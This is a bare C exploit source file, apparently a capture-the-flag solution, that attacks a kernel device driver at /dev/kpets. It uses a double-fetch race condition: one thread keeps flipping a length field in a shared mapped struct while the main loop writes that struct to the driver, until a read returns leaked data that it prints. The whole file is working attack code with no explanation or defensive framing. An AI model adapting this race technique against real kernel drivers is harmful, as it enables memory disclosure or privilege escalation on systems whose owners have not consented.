// diet gcc exploit.c -o exploit -pthread

#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

struct item
{
	char type;
	int namelen;
	char char8[32];
	int desclen;
	char char2C[64];
	char target[1];
};

struct item *pet;

int trial(void *arg) {
	while(1) {
		pet->namelen ^= 0x20+0x40+4+1;
	}
}

int main() {
	pthread_t thread;

	pet = (char *)mmap(NULL, 0x2000, 3, 34, -1, 0);
	pet->type = 0xc2;
	pet->namelen = 0;
	pet->desclen = 0;
	pet->target[0] = 0xaa;

	pthread_create(&thread, NULL, trial, NULL);

	int fd = open("/dev/kpets", 2);
	char buf[0x100]={0,};

	write(fd, pet, 0x6c);

	while(1){
		write(fd,pet,0x6c);
		if(read(fd,buf,0x100)>=1){
			close(fd);
			write(1,buf,strlen(buf));
			write(1,"\n",1);
			break;
		}
	}
}
